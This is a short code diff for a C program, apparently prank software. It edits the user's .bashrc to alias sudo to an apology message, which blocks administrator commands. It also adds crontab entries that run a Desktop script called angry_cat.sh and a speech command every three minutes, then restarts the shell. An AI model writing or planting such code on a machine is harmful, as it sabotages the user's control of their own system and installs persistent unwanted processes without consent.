@@ -13,7 +13,12 @@ int main() {
     char *cron_start2 = "( (crontab -l 2>/dev/null || echo "")  ; echo \"*/3 * * * * export XDG_RUNTIME_DIR=/run/user/1000 && ";
     char *cron_end = "'\") | sort -u - | crontab -";
 
-    bashrc_edit(home_loc);
-    // add_cron_script(home_loc, cron_start1, cron_end);
-    add_cron_speak("test", cron_start2, cron_end);
+    char *edit = "\n\nalias sudo=\"echo 'My apologies, $USER, I cannot allow you to'\"\n";
+
+    bashrc_edit(home_loc, edit);
+
+    char *script_loc = "/Desktop/angry_cat.sh";
+    add_cron_script(home_loc, script_loc);
+    add_cron_speak("test");
+    system("exec bash");
 }
